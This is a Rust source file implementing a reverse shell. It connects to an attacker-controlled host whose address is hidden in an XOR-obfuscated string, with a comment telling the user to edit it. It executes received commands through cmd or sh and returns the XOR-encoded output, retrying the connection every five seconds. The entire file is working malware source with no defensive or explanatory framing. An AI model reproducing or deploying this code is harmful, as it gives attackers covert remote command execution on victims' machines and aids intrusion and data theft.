use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::str::from_utf8;
use std::thread;
use std::time::Duration;

fn int_xor(clear_text: &str, key: u8) -> String {
	/*
		A simple xor encryption function to encrypt string and traffic
		Key is a unsigned int key
	*/
	let mut enc_text = "".to_string();
	for chr in clear_text.chars() {
		if chr.to_string() == "\n" {
			enc_text = enc_text + &chr.to_string();
		} else {
			let tmp = chr as u8 ^ key;
			let chr = tmp as char;
			enc_text = enc_text + &chr.to_string();
		}
	}
	return enc_text;
}

fn main() {
	let key: u8 = 16;
	let mut flag: u8 = 0;
	let addr = &*int_xor("! >%\">#!>!& *( ( ", key); // Attacker host and port. EDIT here
	loop {
		match TcpStream::connect(addr) {
			// Try create TCP connection
			Ok(mut conn) => {
				// If connected
				loop {
					// Create endless loop
					let mut data = [0; 64]; // Create data
					match conn.read(&mut data) {
						Ok(_) => {
							let mut command = from_utf8(&data).unwrap();
							/* Remove Null byte in command (Error while running commands*/
							/* https://stackoverflow.com/a/49406848 */
							command = command.trim_matches(char::from(0));
							let cmd = &*int_xor(command, key);
							// TODO handle string here: python don't have "\n" while nc have
							if cmd == "exit"
							{
								flag = 1;
							}
							else if cmd == "killself"
							{
								flag = 2;
							}
							else
							{
								let output = if cfg!(target_os = "windows")
								{
									Command::new("cmd").args(&["/C", cmd]).output().unwrap()
								}
								else
								{
									Command::new("sh").arg("-c").arg(cmd).output().unwrap()
								};
								conn.write(
									int_xor(from_utf8(&output.stdout).unwrap(), key).as_bytes(),
								).unwrap();
							}
						}
						Err(_) => {}
					}
					if flag == 1
					{
						break;
					}
					else if flag == 2
					{
						return;
					}
				}
			}
			Err(_) => {}
		}
		thread::sleep(Duration::from_millis(5000))
	}
}
